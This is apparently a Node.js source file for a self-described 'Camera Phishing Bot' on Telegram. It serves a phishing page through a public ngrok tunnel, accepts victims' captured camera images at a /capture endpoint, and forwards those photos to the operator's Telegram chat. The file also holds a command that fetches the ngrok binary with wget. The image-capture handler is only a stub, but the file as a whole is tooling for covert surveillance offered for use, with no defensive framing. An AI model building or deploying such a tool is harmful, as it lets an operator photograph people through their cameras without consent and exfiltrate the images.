const TelegramBot = require('node-telegram-bot-api');
const ngrok = require('ngrok');
const express = require('express');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

// Replace with your Telegram bot token
const token = 'YOUR_TELEGRAM_BOT_TOKEN';
const bot = new TelegramBot(token, {polling: true});

// Create directories if they don't exist
const capturedFilesDir = path.join(__dirname, 'captured_files');
const oldFilesDir = path.join(capturedFilesDir, 'old');
const newFilesDir = path.join(capturedFilesDir, 'new');

[capturedFilesDir, oldFilesDir, newFilesDir].forEach(dir => {
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }
});

// Clean up files
function cleanupFiles() {
  try {
    if (fs.existsSync('Log.log')) fs.unlinkSync('Log.log');
    const zipFiles = fs.readdirSync('.').filter(file => file.endsWith('.zip'));
    zipFiles.forEach(file => fs.unlinkSync(file));
    
    // Move PNG files
    const pngFiles = fs.readdirSync('.').filter(file => file.endsWith('.png'));
    pngFiles.forEach(file => {
      fs.renameSync(file, path.join(oldFilesDir, file));
    });
    
    const newPngFiles = fs.readdirSync(newFilesDir).filter(file => file.endsWith('.png'));
    newPngFiles.forEach(file => {
      fs.renameSync(path.join(newFilesDir, file), path.join(oldFilesDir, file));
    });
    
    console.log('Cleanup completed');
  } catch (err) {
    console.error('Error during cleanup:', err);
  }
}

// Install ngrok if not present
async function installNgrok() {
  return new Promise((resolve, reject) => {
    exec('./ngrok -v', (error, stdout, stderr) => {
      if (error) {
        console.log('Installing ngrok...');
        exec('wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip && unzip *.zip && rm *.zip && chmod +x ngrok && export USER=root', 
          (err, stdout, stderr) => {
            if (err) {
              console.error('Error installing ngrok:', err);
              reject(err);
            } else {
              console.log('Ngrok installed successfully');
              resolve();
            }
          });
      } else {
        console.log('Ngrok is already installed');
        resolve();
      }
    });
  });
}

// Configure ngrok
function configureNgrok() {
  const ngrokConfigDir = path.join(process.env.HOME, '.ngrok2');
  const ngrokConfigFile = path.join(ngrokConfigDir, 'ngrok.yml');
  
  if (!fs.existsSync(ngrokConfigDir)) {
    fs.mkdirSync(ngrokConfigDir);
  }
  
  if (!fs.existsSync(ngrokConfigFile)) {
    fs.writeFileSync(ngrokConfigFile, 'web_addr: 4045\n');
  } else {
    const content = fs.readFileSync(ngrokConfigFile, 'utf8');
    if (!content.includes('web_addr: 4045')) {
      fs.appendFileSync(ngrokConfigFile, 'web_addr: 4045\n');
    }
  }
}

// Start ngrok server
async function startNgrokServer(chatId) {
  try {
    // Start local server
    const app = express();
    app.use(express.static('public'));
    
    // Serve the phishing page
    app.get('/', (req, res) => {
      res.sendFile(path.join(__dirname, 'public', 'index.html'));
    });
    
    // Endpoint to receive captured images
    app.post('/capture', (req, res) => {
      // Handle image capture here
      res.sendStatus(200);
    });
    
    const server = app.listen(3333, () => {
      console.log('Local server running on port 3333');
    });
    
    // Start ngrok
    const url = await ngrok.connect({
      proto: 'http',
      addr: 3333,
      region: 'us'
    });
    
    bot.sendMessage(chatId, `Ngrok server started!\nPublic URL: ${url}`);
    
    // Watch for captured files
    watchForCaptures(chatId);
    
    return {
      url,
      close: async () => {
        await ngrok.disconnect();
        await ngrok.kill();
        server.close();
      }
    };
  } catch (err) {
    console.error('Error starting ngrok server:', err);
    bot.sendMessage(chatId, 'Failed to start ngrok server. Please try again.');
    throw err;
  }
}

// Watch for captured files and send to Telegram
function watchForCaptures(chatId) {
  // In a real implementation, you would use fs.watch or similar
  // This is a simplified version
  setInterval(() => {
    const files = fs.readdirSync(newFilesDir);
    if (files.length > 0) {
      files.forEach(file => {
        if (file.endsWith('.png')) {
          const filePath = path.join(newFilesDir, file);
          bot.sendPhoto(chatId, fs.readFileSync(filePath))
            .then(() => {
              fs.renameSync(filePath, path.join(oldFilesDir, file));
            })
            .catch(err => {
              console.error('Error sending photo:', err);
            });
        }
      });
    }
  }, 5000);
}

// Main menu keyboard
const mainMenuKeyboard = {
  reply_markup: {
    keyboard: [
      ['🚀 Start Ngrok Server'],
      ['🛑 Stop Server'],
      ['📸 View Captured Files'],
      ['🧹 Cleanup Files']
    ],
    resize_keyboard: true,
    one_time_keyboard: true
  }
};

// Bot commands
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Welcome to Camera Phishing Bot! Choose an option:', mainMenuKeyboard);
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  
  if (text === '🚀 Start Ngrok Server') {
    try {
      await cleanupFiles();
      await installNgrok();
      configureNgrok();
      
      bot.sendMessage(chatId, 'Starting ngrok server, please wait...');
      const ngrokServer = await startNgrokServer(chatId);
      
      // Store the server instance for this chat
      bot.userData = bot.userData || {};
      bot.userData[chatId] = { ngrokServer };
      
    } catch (err) {
      bot.sendMessage(chatId, 'Error starting server. Please try again.');
    }
    
  } else if (text === '🛑 Stop Server') {
    if (bot.userData && bot.userData[chatId] && bot.userData[chatId].ngrokServer) {
      await bot.userData[chatId].ngrokServer.close();
      delete bot.userData[chatId];
      bot.sendMessage(chatId, 'Server stopped successfully.', mainMenuKeyboard);
    } else {
      bot.sendMessage(chatId, 'No active server to stop.', mainMenuKeyboard);
    }
    
  } else if (text === '📸 View Captured Files') {
    const files = fs.readdirSync(oldFilesDir).filter(file => file.endsWith('.png'));
    if (files.length === 0) {
      bot.sendMessage(chatId, 'No captured files found.', mainMenuKeyboard);
    } else {
      bot.sendMessage(chatId, `Found ${files.length} captured files. Sending...`);
      // Note: Telegram has limits on sending multiple files quickly
      // In a real implementation, you might want to send them in batches
      for (const file of files.slice(0, 5)) { // Limit to 5 files for demo
        try {
          await bot.sendPhoto(chatId, fs.readFileSync(path.join(oldFilesDir, file)));
        } catch (err) {
          console.error('Error sending file:', file, err);
        }
      }
    }
    
  } else if (text === '🧹 Cleanup Files') {
    await cleanupFiles();
    bot.sendMessage(chatId, 'Files cleaned up successfully.', mainMenuKeyboard);
    
  } else if (text !== '/start') {
    bot.sendMessage(chatId, 'Please choose an option from the menu:', mainMenuKeyboard);
  }
});

console.log('Telegram bot is running...');
